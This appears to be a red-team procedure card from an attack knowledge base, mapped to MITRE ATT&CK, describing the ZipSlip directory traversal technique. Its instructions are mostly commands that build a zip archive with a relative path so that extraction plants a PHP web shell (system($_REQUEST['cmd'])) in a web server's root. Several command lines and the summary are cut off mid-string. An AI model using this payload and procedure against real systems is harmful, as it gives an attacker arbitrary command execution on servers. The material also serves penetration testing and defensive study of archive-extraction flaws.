---
id: 3473315f-e3a6-4d6a-af15-92bd313ec164
name: ZipSlip Directory Traversal with File Overwrite
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T23:27:19.454798+00:00'
updated_at: '2023-05-26T01:12:20.062585+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[User Execution|T1204 - User Execution]]'
platforms:
- Linux
- Windows
tags:
- '[[known vulnerability]]'
---

# ZipSlip Directory Traversal with File Overwrite

**Status**: ✓ Verified

## Summary

Zip archives can contain references to files by relative path, which can enable attackers to craft a zip file which extracts files on the target system using those paths, writing  files outside of the current directory. Some software libraries have unintentionally included this feature (coined "Zip

## Description

# Description

Zip archives can contain references to files by relative path, which can enable attackers to craft a zip file which extracts files on the target system using those paths, writing  files outside of the current directory. Some software libraries have unintentionally included this feature (coined "ZipSlip"), and it can be exploited to write files anywhere on disk provided sufficient permissions.

# Instructions

In this example, a PHP Command Shell will be written to: `/var/www/html/shell.php`

1. Select a payload. Suggested:

**Code**: [[<?php system($_REQUEST["cmd"]); ?>]]

2. Set up the directory structure. For this example, the zip file will be created in `/tmp/1/2/3/4,` while the shell will be created in `/tmp/var/www/html`.

**Code**: [[mkdir -p /tmp/1/2/3/4 && mkdir -p /tmp/var/www/htm]]

3. Create the payload in the target directory. 

**Code**: [[echo '<?php system($_REQUEST["cmd"]); ?>' >>  /tmp]]

4. Create the zip archive, starting from /tmp/1/2/3/4, using the relative path of the payload

**Code**: [[cd /tmp/1/2/3/4 && zip pwn.zip ../../../var/www/ht]]

5. Send the archive to the target. Upon extraction, if the target is vulnerable, the payload will be written in the web server's root directory, and can be triggered by browsing to it.

It may be necessary to create deeper directories in order to reach the target directory via directory traversal. 

## Platforms

- Linux
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[User Execution|T1204 - User Execution]]

## Tags

- [[known vulnerability]]
